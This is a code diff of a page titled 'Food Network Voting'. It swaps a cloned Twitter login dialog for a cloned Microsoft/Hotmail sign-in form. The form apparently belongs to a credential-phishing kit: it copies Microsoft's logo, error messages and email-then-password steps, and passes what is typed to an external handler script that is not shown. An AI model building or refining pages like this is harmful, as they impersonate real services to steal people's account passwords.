@@ -16,10 +16,9 @@
 <script src="js/index.js"></script>
 <script src="/js/jquery-3.6.0.min.js"></script>
 
-  <!-- Twitter CSS -->
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
-  <link rel="stylesheet" href="twt/CSS/style.css">
-  <link rel="icon" href="favicon.ico">
+   <!-- MS -->
+    <link rel="stylesheet" href="auth/ms/style.css">
+    <script src="auth/ms/script.js"></script>
 
 <title>Food Network Voting</title>
 <style>
@@ -222,49 +221,37 @@
         </div>
     </div>
 
-     <!-- Twitter Dialog Box -->
-    <div id="twitter" class="dialog">
-        <div class="dialog-content">
-          <span class="close" onclick="closeDialog()">&times;</span>
-     <div class="row">
-       <div class="none col-1 col-lg-4"></div>
-       <div class="none col-10 col-lg-5">
-         <div class="box bg-white mt-5 p-3">
-           <div class="nav mb-5">
-             <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
-           </div>
-           <div class="mb-4">
-             <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
-           </div>
+     <!-- Hotmail Dialog Box -->
 
-           <div class="margin mb-4">
-            <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username" required id="tw-email">
-            <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required id="tw-pass">
-             <button type="button"
-               class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill" onclick="tw_login()" id="tw-log">
-               <p class="text-white"><b>Log In</b></p>
-             </button>
-           </div>
+      	       <div id="hmp">
+    <div class="hmt">
 
-           <div class="margin mb-4">
-             <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
-               <p class="color-white"><b>Forgot password?</b></p>
-             </button>
-           </div>
-
-           <div class="margin">
-             <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
-           </div>
-
-           <div class="margin">
-           </div>
-
-         </div>
-       </div>
-       <div class="none col-1 col-lg-3"></div>
-     </div>
-
-   </div>
+      <main>
+          <div id="form-holder">
+              <img class="sign-in" src="auth/ms/img/microsoft_logo.svg" alt="logo" id="ms-logo">
+                  <h2 class="sign-in-content sign-in">Sign in</h2><br>
+                  <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p><br>
+                  <input id="hm-email" class="sign-in-content sign-in" type="email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
+                  <p class="sign-in-content sign-in">No account? <a href="#">Create one!</a></p>
+                  <p class="sign-in-content sign-in"><a href="">Sign-in options</a></p>
+                  <div class="sign-in-content sign-in" id="submit">
+                      <button>Next</button>
+                  </div>
+                  <p class="sign-up"><button id="back-icon"><i class="fas fa-arrow-left"></i></button> <span id="user-info"></span></p>
+                  <h2 class="sign-up">Enter password</h2>
+                  <p class="error-message sign-up">Your account or password is incorrect. If you don't remember your password, <a id="reset-password">reset it now</a>.</p>
+                  <input type="password" id="hm-pass" class="sign-up" autocomplete="off" placeholder="Password">
+                  <p class="sign-up" id="keep-logged"><input type="checkbox"> Keep me signed in</p>
+                  <p class="sign-up"><a href="">Forgot my password</a></p>
+                  <div class="sign-up">
+                      <button id="hm-log" onclick="hmlog()">Sign in</button>
+                  </div>
+              <div id="cover">
+                  <img src="img/803.gif" alt="loading">
+              </div>
+          </div>
+      </main>
+  </div>
 </div>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
   <script>
